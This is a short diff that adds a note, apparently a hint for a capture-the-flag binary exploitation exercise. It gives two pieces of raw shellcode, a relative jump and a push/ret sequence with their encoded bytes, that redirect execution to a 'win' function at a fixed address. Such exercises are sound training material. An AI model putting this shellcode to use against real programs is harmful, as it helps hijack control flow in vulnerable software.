@@ -1,0 +1,13 @@
+use the following instruction:
+
+jmp -0xEFF8DAC0 :
+"\xE9\x3C\x25\x07\x10"
+
+This instruction is rva of "win" from the address of the satck
+
+Or you can use:
+
+push 0x08048540 #address of win
+ret
+
+"\x68\x40\x85\x04\x08\xC3"
